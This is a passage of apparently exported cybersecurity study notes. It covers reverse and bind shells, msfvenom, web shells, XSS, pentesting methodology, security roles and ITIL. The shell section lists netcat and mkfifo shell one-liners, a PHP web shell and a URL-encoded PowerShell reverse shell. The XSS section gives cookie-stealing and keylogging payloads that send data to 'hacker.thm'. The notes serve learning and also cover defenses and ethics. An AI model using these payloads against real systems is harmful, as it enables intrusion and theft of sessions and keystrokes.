multi/handler\n\nThe `auxiliary/multi/handler` module of the Metasploit framework is, like socat and netcat, used to receive reverse shells.\n\n- The only way to interact with a meterpreter shell and easiest way to handle staged payloads.\n\n### Msfvenom\n\nLike multi/handler, msfvenom is technically part of the Metasploit Framework.\n\n- Shipped as a standalone tool\n- Used to generate payloads on the fly\n- Msfvenom can generate payloads other than reverse and bind shells\n\n## Types of Shell\n\n### Reverse Shells\n\nWhen the target is forced to execute code that connects back to your computer (need a listener back to attacker computer).\n\n- Reverse shells are good way to bypass firewall rules that may prevent from connecting to arbitrary ports on the target.\n  - Drawback is to configure own network to accept the shell over the internet.\n\n#### Reverse Shell Example\n\nA reverse shell listener to receive the connection. A simulation of sending a reverse shell.\n\n![reverse shell](https://i.imgur.com/rN7YkJJ.png)\n\nOn the attacking machine: `sudo nc -lvnp 443`\n\nOn the the target: `nc <LOCAL-IP> <PORT> -e /bin/bash`\n\n### Bind Shells\n\nWhen the code executed on the target is used to start a listener attached to a shell directly on the target.\n\n- Open to the internet allowing to connect to the port that the code has opened and obtain remote code execution.\n  - Advantage of not requiring any configuration on own network, but may be prevented by firewalls protecting the target.\n\n#### Bind Shell Example\n\nListener on the target and telling it to execute `cmd.exe`.\n\nOn the target: `nc -lvnp <PORT> -e \"cmd.exe\"`\n\nOn the attacking machine: `nc MACHINE_IP <PORT>`\n\n![bind shell](https://i.imgur.com/6GUwZsw.png)\n\n### Interactive\n\nIf used Powershell, Bash, Zsh, sh or any other standard CLI environment to allow interaction with programs after executing them.\n\n### Non-Interactive\n\nLimited to using programs which do not require user interaction in order to run properly. The majority of simple reverse and bind shells are non-interactive.\n\n## Common Shell Payloads\n\nOn Linux, we use this code to create a listener for a bind shell: `mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`.\n\n- The command first creates a named pipe at `/tmp/f`. It then starts a netcat listener, and connects the input of the listener to the output of the named pipe.\n- A very similar command can be used to send a netcat reverse shell: `mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`\n- For other common reverse shell payloads, [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) is a repository containing a wide range of shell codes (usually in one-liner format for copying and pasting), in many different languages.\n\n## msfvenom\n\nMsfvenom: The one-stop-shop for all things payload related. Part of the Metasploit framework, msfvenom is used to generate code for primarily reverse and bind shells.\n\nThe standard syntax for msfvenom: `msfvenom -p <PAYLOAD> <OPTIONS>`.\n\n- To generate a Windows x64 Reverse Shell in an exe format: `msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`.\n  - `-f` specifies the output format.\n  - `-o` the output location and filename for the generated payload.\n  - `LHOST=<IP>` specifies the IP to connect back to.\n  - `LPORT=<PORT>` the port on the local machine to connect back to. This can be anything between 0-65535 that isn't already in use. However, the ports below 1024 are restricted and require a listener running with root privileges.\n\n### Staged Payloads\n\nStaged payloads are sent in two parts.\n\n1. Stager - A piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself. Instead, it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions.\n\n- The payloads are split into two parts - a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener - usually the Metasploit multi/handler.\n\n### Stageless Payloads\n\nStageless payloads are more common where they are entirely self-contained. There is one piece of code which, when executed, sends a shell back immediately to the waiting listener.\n\n### Meterpreter\n\n[[Meterpreter shells are Metasploit's own brand of fully-featured shell|metasploit.meterpreter]]. They are completely stable, making them very good when working with Windows targets.\n\n- Built-in functionality such as file uploads and downloads.\n- Downside is meterpreter shells must be caught in Metasploit.\n- Also banned from certain certification examinations.\n\n### Payload Naming Conventions\n\nWhen working with msfvenom, the basic convention is `<OS>/<arch>/<payload>`.\n\n- Example: `linux/x86/shell_reverse_tcp`\n  - This would generate a stageless reverse shell for an x86 Linux target.\n\nThe exception to this convention is Windows 32 bit targets. The arch is not specified: `windows/shell_reverse_tcp`\n\n- For a 64 bit Windows target, the arch would be specified as normal (x64).\n\nStageless payloads are denoted with underscores (`_`). The staged equivalent would be `shell/reverse_tcp`\n\n- Staged payloads are denoted with another forward slash (`/`).\n  - A Windows 64 bit staged Meterpreter payload: `windows/x64/meterpreter/reverse_tcp`\n  - A Linux 32 bit stageless Meterpreter payload: `linux/x86/meterpreter_reverse_tcp`\n\n`msfvenom --list payloads` can be used to list all available payloads, which can then be piped into `grep` to search for a specific set of payloads.\n\n![payloads](https://i.imgur.com/iFO6ydX.png)\n\n### [[Metasploit|metasploit]] multi/handler\n\nMulti/Handler is a superb tool for catching reverse shell. It is essential if you want to use Meterpreter shells, and is the go-to when using staged payloads.\n\n1. Open Metasploit with `msfconsole`.\n2. Type `use multi/handler/`, and press Enter.\n\nUsing the `options` command, we need to set: payload, LHOST and LPORT.\n\n- Set these options with the following commands: \n  - `set PAYLOAD <payload>`\n  - `set LHOST <listen-address>`\n  - `set LPORT <listen-port>`\n\nWe can now start a listener with `exploit -j` to tell Metasploit to launch the module, running the job in the background.\n\n- When multi/handler is in the background, use `sessions` to see all active sessions, and then use `sessions <number>` to select the appropriate session to foreground.\n\n## Web Shells\n\nThere are times where websites allow us an opportunity to upload an executable file. A 'webshell' is a term for a script that runs inside a webserver (usually in a language such as PHP or ASP) which executes code on the server.\n\n- Commands are entered into a webpage - either through an HTML form, or directly in the URL - which are then executed by the script.\n- Extremely useful if there are firewalls in place, or even a stepping stone into a fully fledged reverse or bind shell.\n\nPHP is still the most common server side scripting language.\n\n`<?php echo \"<pre>\" . shell_exec($_GET[\"cmd\"]) . \"</pre>\"; ?>`\n\nThis will take a GET parameter in the URL and execute it on the system with `shell_exec()`. Any commands we enter in the URL after `?cmd=` will be executed  on the system - Windows or Linux. The pre elements are to ensure that the results are formatted correctly on the page.\n\nThere are a variety of web shells available on Kali by default at `/usr/share/webshells` - including the the infamous [PentestMonkey php-reverse-shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) - a full reverse shell written in PHP.\n\n- Most generic, language specific (e.g. PHP) reverse shells are written for Unix based targets such as Linux web servers. They will not work on Windows by default.\n- When the target is Windows, it is often easiest to obtain RCE using a web shell, or by using msfvenom to generate a reverse/bind shell in the language of the server.\n- RCE with URL Encoded Powershell Reverse Shell copied into the URL: \n  - `powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22`\n    - Remember that the IP and Port (bold, towards end of the top line) will still need to be changed in the above code.","n":0.02}}},{"i":32,"$":{"0":{"v":"Scripting","n":1},"1":{"v":"\n# Scripting Overview\n\n- [ ] Learn about the history of scripting languages.\n- [ ] Learn about the common uses of scripting today.\n\n- [ ] Learn about the different concepts related to scripting languages.\n\n- [ ] Learn about the different scripting languages.\n\n---\n\nIBM's Job Control Language (JCL) is often cited as one of the first scripting languages. But while scripting languages were functional, their response time wasn't nearly as fast as modern computers - often took at least a day to get results!\n\n## History of Scripting\n\n- The first interactive shells were developed in the 1960s to enable remote operation of the first time-sharing systems. These used shell scripts, which controlled running computer programs within a computer program, the shell.\n- Calvin Mooers in his TRAC language is generally credited with inventing command substitution, the ability to embed commands in scripts that when interpreted insert a character string into the script.\n- One innovation in the Unix shells was the ability to send the output of one program into the input of another, making it possible to do complex tasks in one line of shell code.\n\n## Script Usage\n\nScripts have multiple uses, but automation is the name of the game.\n\n- Image rollovers\n- Validation\n- Backup\n- Testing\n\n## Concepts\n\n### Scripts\n\n- Small interpreted programs.\n- Script can use functions, procedures, external calls, variables, etc.\n\n### Variables\n\n- Most scripts need to calculate a result or execute a series of instructions and a great way to do so is storing any information we need a variable.\n- A variable is a memory address paired with a symbolic name (identifier) which contain a value.\n  - Can be used to reference, manipulate, replace or delete, the value.\n- Memory space needed for a variable may be allocated only when the variable is first used and freed when it is no longer needed.\n\n### Arguments /  Parameters\n\n- Parameters are pre-established variables which will be used to perform the related process of our function.\n- Parameters appear in procedure definitions; arguments appear in procedure calls.\n  - In the function definition `f(x) = x*x`, the variable x is a parameter.\n  - In the function call f(2), the value 2 is the argument of the function.\n- Although parameters are also commonly referred to as arguments, arguments are sometimes thought of as the actual values or references assigned to the parameter variables when the subroutine is called at run-time.\n\n### If Statement\n\n- The if-then construct (sometimes called if-then-else) is common across many programming languages. Although the syntax varies from language to language, the basic structure looks like this:\n  - If (boolean condition) Then (consequent) Else (alternative) End If.\n\n### Loops\n\n- For Loop\n- While Loop\n- Until Loop\n\n## Scripting Languages\n\n### JavaScript\n\nJavaScript\n: An object oriented scripting language developed in 1995 by Netscape Communications.\n\n- Although it can be used server or client sided, its most popular use by is its client side.\n- A multi-paradigm language, JavaScript supports event-driven, functional, and imperative (including object-oriented and prototype-based) programming styles. It has APIs for working with text, arrays, dates, regular expressions, and the DOM, but the language itself does not include any I/O, such as networking, storage, or graphics facilities. It relies upon the host environment in which it is embedded to provide these features.\n\nVariables in JavaScript can be defined using either the var, let or const keywords.\n\n- `let x` // declares the variable x and assigns to it the special value \"undefined\".\n- `let y = 2;` // declares the variable y and assigns to it the value 2.\n- `let z = \"Hello, World!\";` // declares the variable z and assigns to it a string containing \"Hello, World!\".\n\n### Bash\n\nBash\n: GNU Bash or simply bash is Unix shell and command language written by Brian Fox for GNU Project as a free software replacement for the Bourne shell. First released in 1989, it has been used widely as the default login shell for most Linux distributions and Apple's macOS Mojave and earlier versions.\n\n- Bash is a command processor that typically runs in a text window where the user types commands that cause actions. Bash can also read and execute commands from a file, called a shell script.\n- Supports filename globbing (wildcard matching), piping, here documents, command substitution, variables, and control structures for condition-testing and iteration.\n- Bash is a POSIX-compliant shell, but with a number of extensions.\n\nHere is an example:\n\n``` bash\n#!/bin/bash\nmyvariable=Hello\nanothervar=Fred\necho $myvariable $anothervar\necho\nsampledir=/etc\nls $sampledir\n```\n\n### Perl\n\nPerl\n: Larry Wall began work on Perl in 1987, while working as a programmer at Unisys, and released version 1.0 to the comp.sources.misc newsgroup on December 18, 1987.\n\n- Perl 2, released in 1988, featured a better regular expression engine.\n- Perl 3, released in 1989, added support for binary data streams.\n\nOriginally, the only documentation for Perl was a single lengthy man page. In 1991, Programming Perl, known to many Perl programmers as the \"Camel Book\" because of its cover, was published and became the reference for the language.\n\nPerl variables do not have to be explicitly declared to reserve memory space. The declaration happens automatically when you assign a value to a variable. The equal sign (=) is used to assign values to a variables.\n\n- `$age = 25; # An integer assignment`\n- `$name = \"John Paul\"; # A string`\n- `$salary = 1445.50; # A floating point`\n\n### PowerShell\n\nPowerShell\n: A task automation and configuration management from Microsoft, consisting of command-line shell and associated scripting language. Initially, a Windows component only, known as Windows PowerShell, it was made open-source and cross-platform on 18 August 2016 with the introduction of PowerShell Core. The former is built on .NET Framework while the latter on .NET Core.\n\n- Administrative tasks are generally performed by cmdlets (pronounced command-lets), which are specialized .NET classes implementing a particular operation. These work by accessing data in different data stores, like the file system or registry, which are made available to PowerShell via providers. Third-party developers can add cmdlets and providers to PowerShell. Cmdlets may be used by scripts and scripts may be packaged into modules.\n\n### Binary\n\nBinary\n: Code represents text, computer processor instructions, or any other data using a two-symbol system. Often \"0\" and \"1\" from the binary number system. The binary code assigns a pattern of binary digits, also known as bits, to each character, instruction, etc. A binary string of eight bights can represent any of 256 possible values and can, therefore, represent a wide variety of different items.\n\n- In computing and telecommunications, binary codes are used for various methods of encoding data, such as character strings, into bit strings. Those methods may use fixed-width strings. In fixed-width binary code, each letter, digit, or other character is represented by a bit string of the same length; that big string, interpreted as a binary number, is usually displayed in code tables in octal, decimal or hexadecimal notation.\n\n### Hex\n\nHex\n: Advanced hex editors have scripting systems that let the user create macro like functionality as a sequence of user interface commands for automating common tasks.\n\n- Can be used for providing scripts that automatically patch files (e.g., game cheating, modding, or product fixes provided by community) or to write more complex/intelligent templates.\n- Scripting languages vary widely, often being product specific languages resembling MS-DOS batch files, to systems that support fully-fledged scripting languages such as Lua or Python.","n":0.029}}},{"i":33,"$":{"0":{"v":"Python","n":1},"1":{"v":"\n# Python Basics\n\n- [ ] Understand what the benefits are of using Python.\n\n- [ ] Describe the basic syntax of Python.\n- [ ] Describe Python data structures.\n- [ ] Describe the basic syntax of conditions and branching.\n\n- [ ] Understand functions and methods of Python scripting.\n- [ ] Describe Python Libraries.\n---\n\n## Benefits of Using Python\n\nWorldwide, Python is the most popular language, Python gew the most in the last 5 years (19.4%) and Java lost the most (-7.2%).\n\n1.

Below are a few reports of XSS found in massive applications:\n\n\n- eBay XSS bug left users vulnerable to (almost) undetectable phishing attacks.\n- The Apache Foundation hacked by exploiting XSS in JIRA.\n- XSS found in Shopify.\n- $7,500 for XSS found in Steam chat.\n- $2,500 for XSS in HackerOne.\n- XSS found in Infogram.\n\n### Effective Defenses\n\n#### HTML Encoding\n\n- Output Encoding works well for server side generate pages and is quite effective in neutralizing most XSS payloads.\n  - HTML Encoding alone will not prevent charset attacks.\n\n#### JavaScript Escaping\n\n- XSS can be introduced with JavaScript code.\n- Escaping single quotes will prevent injection.\n\n#### Safe DOM Elements\n\n- XSS in modern Rich Client UIs is often made possible by unsafe handling of the DOM.\n- Using the `innerHtml` attribute allows the user input to be rendered as HTML and XSS with JavaScript events as possible.\n- The safe alternative is to use `textContent` (or `innerText` in some versions of IE).\n\n#### Use Eval and Dynamic Code Generation with Care\n\n- JavaScript `eval()` function which accepts a JavaScript expression as a string argument and executes it. Use of this function is discouraged.\n- Same care is needed when the code generates pieces of JavaScript dynamically. Also discouraged.\n\n#### Input Validation\n\n**Whitelisting** is recommended.\n\n- Reduces the attack surface to a known quantity.\n- If possible, most input should be whitelisted to alphanumeric to prevent XSS (and many other attacks).\n- Special characters should only be allowed on an exception basis.\n- Some cases may be relaxed to allow single quotes or other characters.\n\n**Blacklisting** - NOT RECOMMENDED.\n\n- Creative attacker may bypass blacklist by trying a previously unknown method.\n\n**Client Side Input Validation** - NOT RECOMMENDED.\n\n- Can only be used to assist with product usability.\n- Attackers can easily bypass it by sending the request directly to the server.\n\n#### Use Proven Validation and Encoding Functionality\n\n- Protect both input and output - \"Defense in Depth\" principle.\n- As you validate the input and encode the output, use proven and reputable libraries.\n- It is best to implement a framework that has one central set of functionality that validates and encodes data.\n\n## XSS Payloads\n\nIn XSS, the payload is the JavaScript code we wish to be executed on the target's computer. There are two parts to the payload: the intention and the modification.\n\n- Intention is what you wish the JavaScript to actually do.\n- Modification is the changes to the code we need to make it execute as every scenario is different.\n\nExamples of XSS Intentions:\n\n- **Proof of Concept**: Simplest payload to demonstrate XSS is possible on a website - causing an alert box to pop up on the page with a string of text.\n  - `<script>alert('XSS');</script>`\n- **Session Stealing**: Details of a user's session, such as login tokens, are often kept in cookies on the target's machine.\n  - `<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`\n    - Takes target's cookie, base64 encodes the cookie to ensure successful transmission for control to be logged in.\n- **Key Logger**: Acts as a key logger where anything typed on the webpage will be forwarded to a website under the hacker's control.\n  - `<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`\n- **Business Logic**: Calls a particular network resource or a JavaScript function. In this example for changing the email's address called `user.changeEmail()`.\n  - `<script>user.changeEmail('attacker@hacker.thm');</script>`\n    - Allows a password reset for the attacker.\n\n### Reflected XSS\n\nReflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation.\n\n![reflected-error](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/a5b0dbc4d2f1f69988f82f2c5d53f6ed.png)\n![reflected](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/7f90b73106d655b07874943f93533f7b.png)\n\nA website where entering the incorrect input, an error message is displayed to the parameter in the query string directly into the page source.\n\n- The application does not check the contents of the error parameter, which allows the attacker to insert the malicious code.\n\n![xss](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/8e3bffe500771c03366de569c3565058.png)\n\n- The attacker could send links or embed them into an iframe on another website containing a JavaScript payload to potential victims getting them to execute on their browser, potentially revealing session or customer information.\n\n#### How to Test for Reflected XSS\n\nCheck every possible point of entry:\n\n- Parameters in the URL query string\n- URL file path\n- Sometimes HTTP headers (unlikely exploitable)\n\n### Stored XSS\n\nThe XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.\n\n![stored-XSS](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/cc2566d297f7328d91bc8552f902210e.png)\n\nA blog website that allows users to post comments, but these comments are not checked or filtered for any malicious JavaScript code.\n\n- The malicious JavaScript could redirect users to another site, steal the user's session cookie, or perform other website actions while acting as the visiting user.\n\n#### How to Test for Stored XSS\n\nTest every possible entry point where it seems data is stored and then shown back in areas that other users have access to:\n\n- Comments on a blog\n- User profile information\n- Website listings\n\n### DOM-Based XSS\n\nDOM stands for Document Object Model and is a programming interface for HTML and XML documents. A web page is a document, and this document can be either displayed in the browser window or as the HTML source.\n\n![DOM](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/24a54ac532b5820bf0ffdddf00ab2247.png)\n\n- DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction.\n- Crafted links could be sent to potential victims, redirecting them to another website or steal content from the page or the user's session.\n  - An example: JavaScript gets the contents from the `window.location.hash` parameter and then writes that onto the page in the currently being viewed section. The contents of the hash are not checked for malicious code, allowing an attacker to inject JavaScript of their choosing onto their webpage.\n\n#### How to Test for DOM Based XSS\n\nChallenging to test for and requires a certain amount of JavaScript knowledge to read the source code.\n\n- Look for parts of code that access certain variables that an attacker can have control over, such as 'window.location.x' parameters.\n  - See how they are handled and whether the values are written to the web page's DOM or passed to unsafe JavaScript methods such as `eval()`.\n\n### Blind XSS\n\nBlind XSS is similar to a stored XSS in that the payload gets stored on the website for another user to view, but in this instance, can't see the payload working or be able to test it against yourself first.\n\nA website has a contact form where you can message a member of staff. The message content does not get checked for any malicious code, which allows the attacker to enter anything they wish.\n\n- Using the correct payload, the attacker's JavaScript could make calls back to an attacker's website, revealing the staff portal URL, the staff member's cookies, and even the contents of the portal page viewed.\n\n#### How to Test for Blind XSS\n\n- When testing for Blind XSS vulnerabilities, need to ensure payload has a call back (usually an HTTP request) to know is being executed.\n- A popular tool for Blind XSS attacks is [xsshunter](https://xsshunter.com/).","n":0.025}}},{"i":35,"$":{"0":{"v":"Roles Process","n":0.707},"1":{"v":"\n# Frameworks and Purpose\n\n- [ ] Describe the purpose of frameworks, baselines and best practices in an effective cybersecurity strategy.\n\n- [ ] Describe the various roles typical to a Cybersecurity organization.\n\n---\n\n## Security Standards and Compliance\n\n| Best practices, baselines and frameworks | Normative and compliance |\n| ---------------------------------------- | ------------------------ |\n| Used to improve the controls, methodologies and governance for the IT departments or the global behavior of the organization                                         | Rules to follow for a specific industry |\n| Seeks to improve performance, controls and metrics | Enforcement for the government, industry, or clients |\n| Helps translate the business needs into technical or operational needs | Event if the company or the organization do not want to implement those controls, for compliance |\n\n- COBIT\n- ITIL\n- ISOs\n- COSO\n- Project manager methodologies\n- Industry best practices\n- Developer recommendations\n- Others\n  \n## Roles in Security\n\nCISO (Chief Information Security Officer)\n: A high-level management position responsible for the entire computer security department and staff.\n\nInformation Security Architect\n: Responsible for maintaining the security of a company's computer system.\n\nInformation Security Consultant/Specialist\n: Encompass any one or all of the other roles/titles, tasked with protecting computers, networks, software, data, and/or information systems against viruses, worms, spyware, malware, intrusion detection, unauthorized access, denial-of-service attacks, and an ever increasing list of attacks by hackers acting as individuals or as part of organized crime or foreign governments.\n\nInformation Security Analyst\n: Conducts information security assessments for organizations and analyzes the events, alerts, alarms and any information that could be useful to identify any threats that could compromise the organization.\n\nInformation Security Auditor\n: In charge of testing the effectiveness of computer information systems, including the security of the systems and reports their findings.\n\nSecurity Software Developer\n: Someone who develops and integrates security into software during the course of design and development.\n  \nPenetration Tester / Ethical Hacker\n: Highly skilled security specialists spend time to breach systems to identify security gaps and fix them before malicious hackers find them.\n\nVulnerability Assessor\n: Scans applications and systems to identify vulnerabilities.\n","n":0.056}}},{"i":36,"$":{"0":{"v":"business-IT","n":1},"1":{"v":"\n# Business Process Management and IT Infrastructure Library Basics\n\n- [ ] Discuss how processes are important to our every day lives and for IT security.\n- [ ] Discuss the definition of a Security Operations Center (SOC).\n\n- [ ] Define a process and its attributes.\n- [ ] Describe standard process roles.\n- [ ] Explain what makes a process successful.\n- [ ] Describe process performance metrics.\n\n- [ ] Define the IT Infrastructure Library (ITIL).\n- [ ] Describe Service Strategy, Service Design and Service Operations as it relates to ITIL.\n- [ ] Describe Continual Service Improvement.\n\n- [ ] Describe key ITIL processes including: Problem, Change, Incident, Event, Service Level, and Information Security Management.\n\n---\n\n## Process\n\nWe engage, or are involved in processes all the time; in both our personal and professional lives.\n\n### Processes and IT Security\n\nCyberattacks and Alerts are increasing and growing exponentially complex and targeted.\n\nThis requires more time and attention from Security Analysts.

The FBI estimates cyber criminals have stolen more than $12 billion from companies over a five-year span using phishing attacks and business email compromise.\n\nThese are no longer isolated incidents. A study by the University of Maryland concluded that an attack occurs on average every 39 seconds... Nearly half of all small businesses have been attacked with disastrous results.\n\n- 60% of small and medium-sized business that get hacked go out of business after just six months.","n":0.034}}},{"i":38,"$":{"0":{"v":"Penetration Test","n":0.707},"1":{"v":"\n# Introduction to Penetration Testing\n\n- [ ] Learn what pentesting (penetration testing) is and why it's important.\n- [ ] Understand the different types of pentesting.\n- [ ] Review the different approaches to pentesting.\n\n- [ ] Understanding the planning phase of penetration testing.\n- [ ] Consider the ramifications of a real attack.\n  \n- [ ] Learn what vulnerability analysis is and its role in pentesting.\n- [ ] Learn about different methods of gathering information.\n- [ ] Understand what role social engineering plays in discovering information.\n- [ ] Learn about different scanning tools.\n\n- [ ] Learn about different methods of gaining access to a system:\n  - [ ] Passive\n  - [ ] Active\n  - [ ] Offline\n  - [ ] Without technology\n\n- [ ] Understand the phases of a pentest attack.\n- [ ] Learn what types of vulnerabilities are exploited.\n\n- [ ] Learn about the Executive Summary and what information it details.\n- [ ] Learn about the Technical Report and its benefits.\n\n- [ ] What are the industry-leading tools used for penetration testing?\n\n## What is Penetration Testing?\n\nPenetration Testing\n: Security testing in which assessors mimic real-world attacks to identify methods for circumventing the security features of an application, system, or network. It often involves launching real attacks on real systems and data that use tools and techniques commonly used by attackers.\n\n### What is the Importance of Pentesting?\n\nWith cyber attacks becoming the norm, it is more important than ever to undertake regular vulnerability scans and penetration testing to identify vulnerabilities and ensure the cyber controls are working.\n\n### Operating Systems\n\nDesktop\n- Windows\n- Unix\n- Linux\n- MacOS\n- Chrome\n- Ubuntu\n\nMobile\n- iOS\n- Android\n- Blackberry OS\n- Windows Mobile\n- WebOS\n- Symbian OS\n\n### Approaches\n\nNo two penetration tests are going to be the same because each company uses different tools, systems, and applications.\n\n- Internal vs. external.\n- Web & mobile application assessments.\n- Social engineering.\n- Wireless network, embedded device & IoT.\n- ICS penetration.\n\n### Penetration Testing Phases\n\n1. Planning\n2. Discovery\n3. Attack\n4. Report\n\n#### Planning\n\n- Setting objectives\n  - What are the goals of the pentest?\n  - What are your targets?\n- Establishing boundaries\n  - There are legal and ethical ramifications to consider.\n  - Since the attacks are real they have the potential to interrupt availability of key functions and services.\n- Informing Need-to-know employees.\n  - Since there will always be some social engineering, it might be wise to inform local security so no one is arrested during the test.\n\n#### Discovery\n\nVulnerability Analysis\n: Vulnerability scanning can help identify outdated software versions, missing patches, and missing patches, and misconfigurations, and validate compliance with or deviations from an organization's security policy. This is done by identifying the operating systems and major software applications running on the hosts and matching them with information on known vulnerabilities stored in the scanners' vulnerability databases.\n\n##### Google Dorks\n\nA Google Dork query, sometimes referred to as dork, is a search string that uses advanced search operators to find information that is not readily available on a website.\n\nData can be found using Google Dorks:\n\n- Admin login pages\n- Username and passwords\n- Vulnerable entities\n- Sensitive documents\n- Government/military data\n- Email lists\n- Bank account details and lots more...\n\n##### Passive vs. Active\n\n- Monitoring employees.\n- Listening to network traffic.\n- Network mapping.\n- Port scanning.\n- Password cracking.\n\n**Passive-Online**\n\nWire Sniffing\n: Capturing data packet across the computer network.\n\nMan in the Middle\n: Hijacking a session in real-time to obtain access.\n\nReplay Attack\n: A valid data transmission is maliciously or fraudulently repeated or delayed.\n\n**Active-Online**\n\nPassword Guessing\n: Also known as \"brute force attack\".\n\nTrojan/Spyware/Keyloggers\n: A spy software which collects different types of data from the session.\n\nHash Injection\n: Authenticate to a remote server or service using the underlying NTLM or LanMan hash of a user's password.\n\nPhishing\n: Users are tricked into clicking a malicious link, which can lead to the installation of malware, a ransomware attack, or disclosure of information.\n\n**Offline Attacks**\n\nPre-Computed Hashes\n: Data structure that uses a hash function to store, order and/or access data in an array.\n\nDistributed Network Attack (DNA)\n: A password cracking system sold by AccessData.

Cybersecurity is relevant to all people in the modern world, including a strong password policy to protect emails or to businesses and other organizations needing to protect both devices and data from damages.\n\n- A penetration test or pentest is ethically-driven attempt to test and analyze the security defenses to protect these assets and pieces of information. A penetration test involves using the same tools, techniques, and methodologies that someone with malicious intent would use and is similar to an audit.\n- According to [Security Magazine](https://www.securitymagazine.com/articles/87787-hackers-attack-every-39-seconds), a cybersecurity industry magazine, there are over 2,200 cyber attacks every day - 1 attack every 39 seconds.\n\n## Ethics\n\nA penetration test is an **authorized audit** of a computer system's security and defenses as agreed by the owners of the systems. Anything that falls outside of the agreement is deemed unauthorized. Before a penetration test starts, a formal discussion occurs between the penetration tester and the system owner. The discussion forms the scope of the penetration testing agreement and will determine the course the penetration test takes.\n\nCompanies that provide penetration testing services are held against legal frameworks and industry accreditation. For example, the National Cyber Security Centre (NCSC) has the CHECK accreditation scheme in the UK. This check means that only _\"CHECK approved companies can conduct authorized penetration tests of public sector and CNI systems and networks.\"_ (NCSC).\n\nPenetration testers will often be faced with potentially morally questionable decisions during a penetration test. Ethics is the moral debate between right and wrong; where an action may be legal; it may go against an individual's belief system of right and wrong.\n\nHackers are sorted into three hats, where their ethics and motivations behind their actions determine what hat category they are placed into.\n\n\n| Hat Category | Description                                                                                                    | Example                                                                         |\n| ------------ | -------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------- |\n| White Hat    | Considered 'good' people.

This permission is essential to legally protect individuals and organizations for the activities carried out. |\n| Test Scope | Annotate specific targets to which the engagement should apply. The test may only apply to certain servers or applications but not the entire network.                                 |\n| Rules      | Define exactly the techniques that are permitted during the engagement.

No penetration test is the same, and there are no one-case fits all.\n\nThe steps a penetration tester takes during an engagement is known as the methodology. There are general theme of the following stages:\n\n| Stage                 | Description                                                                                                                                          |\n| --------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |\n| Information Gathering | Involves collecting as much public accessible information about a target/organization as possible (Does not involve scanning any systems).           |\n| Enumeration/Scanning  | Involves discovering applications and services running on the systems.                                                                               |\n| Exploitation          | Leveraging vulnerabilities discovered on a system or application. This stage can involve the use of public exploits or exploiting application logic. |\n| Privilege Escalation  | Once exploited, this stage is the attempt to expand your access to a system.

The more knowledge about a target system or network, the more options are available.\n\n- 'Map' or landscape is called port scanning.\n  - When a computer runs a network service, it opens a networking construct called a 'port' to receive the connection. Ports are necessary for making multiple network requests or having multiple services available.\n- Network connections are made between two ports - an open port listening on the server and a randomly selected port on your own computer.\n  - When you connect to a web page, your computer may open port 49534 to connect to the server's port 443.\n- ![ports](https://i.imgur.com/3XAfRpI.png)\n\nEvery computer has a total of 65535 available ports; however, many of these are registered as standard ports.\n\n- For example, a HTTP web service can nearly always be found on port 80 of the server.\n- HTTPS web service on port 443.\n- Windows NETBIOS on port 139 and SMB on port 445.\n\nWe begin any attack with a port scan using a tool called nmap. Nmap will connect to each port of the target in turn. Depending on how the port responds, it can be determined as being open, closed, or filtered (usually by a firewall).\n\n- nmap is the industry standard and is a powerful tool with its scripting engine which can be used to scan for vulnerabilities, and some perform exploit directly.\n\n## Nmap Parameters\n\n- `-sS` = Syn scan\n- `-sU` = UDP scan\n- `-O` = Detect operating system\n- `-sV` = Detect version of the services running\n- `-v` = Increase verbosity level 1\n- `-vv` = Verbosity level 2\n- `-oA` = Save the nmap results in three major formats\n- `-oN` = Save nmap results in a 'normal' format\n    - `-oG` = A useful output to save results in a 'grepable' format\n- `-A` = Aggressive mode to activate service detection, operating system detection, traceroute and common script scanning.\n- `-T5` = Set timing template to increase the speed scans run at to level 5.\n- `-p 80` = Scan only port 80\n- `-p 1000-1500` = Scan ports 